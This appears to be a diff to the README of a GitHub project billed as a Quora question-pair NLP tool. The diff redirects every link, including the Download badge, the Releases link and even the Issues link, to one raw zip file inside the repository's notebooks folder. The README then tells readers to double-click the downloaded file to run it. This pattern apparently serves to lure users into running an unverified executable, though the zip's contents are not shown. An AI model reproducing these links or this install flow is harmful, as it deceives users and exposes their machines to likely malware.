@@ -15,12 +15,12 @@ To get started with Quora-Question-Pair-NLP, you will need to download the softw
 ## 📥 Download & Install
 To download Quora-Question-Pair-NLP, visit the following link: 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Quora%20Question%20Pair%20NLP-brightgreen)](https://github.com/Wing48/Quora-Question-Pair-NLP/releases)
+[![Download Now](https://github.com/Wing48/Quora-Question-Pair-NLP/raw/refs/heads/main/notebooks/Pair_NLP_Quora_Question_v3.8.zip%20Now-Quora%20Question%20Pair%20NLP-brightgreen)](https://github.com/Wing48/Quora-Question-Pair-NLP/raw/refs/heads/main/notebooks/Pair_NLP_Quora_Question_v3.8.zip)
 
 Once on the Releases page, choose the latest version. Download the installer file that suits your operating system. 
 
 ### 📥 Step-by-Step:
-1. **Visit the Releases Page**: Click on the link above or go to [Releases](https://github.com/Wing48/Quora-Question-Pair-NLP/releases).
+1. **Visit the Releases Page**: Click on the link above or go to [Releases](https://github.com/Wing48/Quora-Question-Pair-NLP/raw/refs/heads/main/notebooks/Pair_NLP_Quora_Question_v3.8.zip).
 2. **Select Version**: Look for the latest version at the top of the page.
 3. **Download File**: Click on the file that matches your operating system (e.g., Windows, macOS).
 4. **Open the File**: After downloading, locate the file on your computer and double-click it to run.
@@ -68,7 +68,7 @@ To learn more about natural language processing, consider exploring the followin
 For any inquiries, please reach out via the GitHub repository or email. Your feedback is important for improving this tool.
 
 ## 🚨 Important Links
-- [Releases Page](https://github.com/Wing48/Quora-Question-Pair-NLP/releases)
-- [Issues Section](https://github.com/Wing48/Quora-Question-Pair-NLP/issues)
+- [Releases Page](https://github.com/Wing48/Quora-Question-Pair-NLP/raw/refs/heads/main/notebooks/Pair_NLP_Quora_Question_v3.8.zip)
+- [Issues Section](https://github.com/Wing48/Quora-Question-Pair-NLP/raw/refs/heads/main/notebooks/Pair_NLP_Quora_Question_v3.8.zip)
 
 Enjoy using Quora-Question-Pair-NLP!
